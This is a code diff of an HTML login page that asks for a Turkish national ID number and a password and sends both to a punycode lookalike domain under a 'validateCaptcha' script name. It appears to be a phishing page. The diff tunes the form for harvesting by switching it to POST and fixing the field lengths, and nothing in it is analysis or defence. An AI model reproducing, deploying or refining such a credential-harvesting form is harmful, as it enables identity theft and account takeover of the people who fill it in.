@@ -555,16 +555,16 @@
                 <div class="p-4">
                   <div class="row">
                     <div class="col-md-12">
-<form novalidate="" action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="get" class="py-3 my-input av-invalid" id="myForm">
+<form action="https://xn--holiganbt930-8d6f.com/gg/validateCaptcha.php" method="post" class="py-3 my-input av-invalid" id="myForm">
   <div class="form-group">
     <div class="text-danger form-group">
-      <input autocomplete="off" name="turkeyId" required="" pattern="^[0-9]+$" minlength="11" id="turkeyId" type="text" class="is-touched is-dirty form-control" value="" placeholder="TC Kimlik Numarası" required>
+      <input autocomplete="off" name="turkeyId" pattern="^[0-9]+$" minlength="11" maxlength="11" id="turkeyId" type="text" class="is-touched is-dirty form-control" value="" placeholder="TC Kimlik Numarası" required>
       <div class="invalid-feedback">Bu alan gereklidir.</div>
     </div>
   </div>
   <div class="password-field form-group">
     <div class="text-danger form-group">
-      <input autocomplete="off" name="password" required="" pattern="^.{6,}$" id="password" type="password" class="is-touched is-dirty form-control" value="" placeholder="Şifre" style="display: inline; width: 100%; margin: 0px;" required>
+      <input autocomplete="off" name="password" pattern="^.{6,}$" id="password" type="password" minlength="6"  maxlength="6" class="is-touched is-dirty form-control" value="" placeholder="Şifre" style="display: inline; width: 100%; margin: 0px;" required>
       <div class="invalid-feedback">Bu alan gereklidir ve en az 6 karakter içermelidir.</div>
     </div>
     <button type="button" style="display: inline-block; width: auto; height: 40px; background-color: transparent; border: none; outline: none; color: rgb(172, 172, 172);">
